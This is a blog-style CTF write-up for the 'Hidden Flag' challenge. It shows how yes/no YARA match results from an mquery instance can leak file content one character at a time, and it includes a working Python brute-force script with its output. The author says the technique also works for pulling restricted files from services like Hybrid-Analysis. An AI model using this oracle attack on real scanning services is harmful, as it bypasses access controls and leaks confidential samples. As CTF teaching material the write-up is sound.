---
title: CONFidence Teaser CTF – Hidden Flag
author: Megabeets
type: 
date: 2020-03-15T10:57:56+00:00

categories:
  - Writeups
tags:
  - CONFidence
  - CTF

---
During CONFidence Teaser CTF, one specific task caught my interest. Not because it was hard or complicated &#8211; it wasn&#8217;t, but because the concept behind it was interesting and relevant to my day-to-day work as a malware researcher. 

In this short article, I will show a **highly esoteric**, not to say **trivial**, concept in which you can leak the content of &#8220;sensitive&#8221; files on systems where scanning the files with Yara is allowed, but downloading the files is not possible. Not only that I&#8217;ll show how it was used, as an **intended solution**, to solve the &#8220;Hidden Flag&#8221; challenge on the CTF, but will also demonstrate how it can be used to retrieve the data of TLP;RED, or un-downloadable files on premium services such as Hybrid-Analysis, where the major limitation is the bandwidth.

Let&#8217;s not move too fast and start from the beginning, the CTF challenge. On &#8220;Hidden-Flag&#8221;, the most solved challenge in this CTF, we are given an online instance of [mquery][1], a &#8220;YARA malware query accelerator&#8221;. In other words, the system lets you run your Yara rules on a repository of files, very fast. The flag, as it seems, exists in the content of a file found the corpus of files that are indexed and scanned by _mquery_. As a malware researcher, and as a [cert.pl][2] old fanboy, I was already familiar with _mquery_ and experienced with using it. 

The initial idea was to extract the flag using boolean queries of Yara rules. To prove that this concept really works, I started from this sample rule:

```
rule test {
  strings:
    $flag = "p4{"
  condition:
    $flag
}
```


And indeed, this simple rule showed that the concept is potentially possible and we can start slowly retrieving the flag. 

</p> <figure class="wp-block-image size-large">

<img src="./mquery-screenshot.png" /> </figure> 

In order to retrieve the rest of the flag, we can start to slowly &#8220;brute force&#8221; it character by character, hoping there will not be any &#8220;brute force&#8221; mitigation or similar limitation. Since I am familiar with the project, I know it has a REST API we can use for our help. For those of you who aren&#8217;t familiar, can figure this out from the [tests][3].

And indeed, we can quickly write a script to brute force the flag character by character.

```
import string
import requests

QUERY_URL = "http://hidden.zajebistyc.tf/api/query/high"
MATCHES_URL = "http://hidden.zajebistyc.tf/api/matches/{}?offset=0&limit=50"

def request_query (query):
    res = requests.post(QUERY_URL, json={"method": "query", "raw_yara": query})
    res.raise_for_status()
    query_hash = res.json()["query_hash"]
    res = requests.get(MATCHES_URL.format(query_hash))
    if res.json()["job"]["status"] == "done":
        return res


# Define a rule tempplate

test_yara = """
rule find_flag {{
    strings:
        $flag = "{0}"
    condition:
        $flag
}}
"""

# Generate a list of potential characters
potential_chars = "-_}"+string.ascii_lowercase+string.digits+string.ascii_uppercase+"@!"  

# Start from the known prefix of the flag

flag = "p4{"

while True:
    print("[+] Found:",flag)
    for c in potential_chars:
        res = request_query(test_yara.format(flag + c))
        if len(res.json()["matches"]) > 0:
            flag += c
            break
    if c == "}":
        break

print("[+] Flag:", flag)

# flag is "p4{ind3x1ng-l3ak5}"
```


Let&#8217;s run the script and see the results come quickly:

```
$ python3 solution.py

[+] Found: p4{
[+] Found: p4{i
[+] Found: p4{in
[+] Found: p4{ind
[+] Found: p4{ind3
[+] Found: p4{ind3x
[+] Found: p4{ind3x1
[+] Found: p4{ind3x1n
[+] Found: p4{ind3x1ng
[+] Found: p4{ind3x1ng-
[+] Found: p4{ind3x1ng-l
[+] Found: p4{ind3x1ng-l3
[+] Found: p4{ind3x1ng-l3a
[+] Found: p4{ind3x1ng-l3ak
[+] Found: p4{ind3x1ng-l3ak5
[+] Flag: p4{ind3x1ng-l3ak5}
```




 [1]: https://github.com/CERT-Polska/mquery
 [2]: https://www.cert.pl/en/
 [3]: https://github.com/CERT-Polska/mquery/blob/master/src/tests/test_api.py